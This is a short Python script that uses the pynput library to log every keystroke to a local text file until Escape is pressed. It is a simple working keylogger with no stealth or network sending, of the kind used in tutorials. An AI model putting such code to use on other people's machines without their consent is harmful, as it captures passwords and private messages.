from pynput import keyboard

# Path to the log file
log_file = "key_log.txt"

def on_press(key):
    try:
        # Open the log file in append mode and write the key
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # If the key does not have a char attribute (e.g., special keys)
        with open(log_file, "a") as f:
            f.write(f" {key} ")

def on_release(key):
    # Stop listener on escape key
    if key == keyboard.Key.esc:
        return False

# Setup the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
